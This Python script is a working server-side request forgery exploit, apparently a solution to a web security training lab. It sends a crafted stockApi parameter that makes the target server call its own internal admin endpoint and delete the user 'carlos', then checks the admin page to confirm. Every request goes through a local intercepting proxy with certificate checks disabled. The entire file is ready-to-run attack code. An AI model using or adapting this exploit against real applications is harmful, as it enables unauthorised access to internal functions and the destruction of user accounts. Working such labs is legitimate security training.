import requests
import sys
import urllib3
from requests.exceptions import ProxyError, RequestException

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_user(url):
    try:
        delete_user_url_ssrf_payload = 'http://localhost/admin/delete?username=carlos'
        check_stock_path = 'product/stock'
        
        # Step 1: Attempt to delete the user
        params = {'stockApi': delete_user_url_ssrf_payload}
        r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)
        print(f"Response from delete request:\n{r.text}\n")  # Debugging output

        # Step 2: Check if user was deleted by accessing admin page
        admin_ssrf_payload = 'http://localhost/admin'
        params2 = {'stockApi': admin_ssrf_payload}
        r = requests.post(url + check_stock_path, data=params2, verify=False, proxies=proxies)
        print(f"Response from admin check:\n{r.text}\n")  # Debugging output

        # Check for success message
        if 'User deleted successfully' in r.text:
            print("(+) Successfully deleted Carlos user!")
        else:
            print("(-) Exploit was unsuccessful. Check response and payload.")
    except ProxyError:
        print("(-) Connection to proxy failed. Ensure your proxy server is running and reachable.")
    except RequestException as e:
        print(f"(-) Request failed: {e}")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Deleting Carlos user...")
    delete_user(url)

if __name__ == "__main__":
    main()
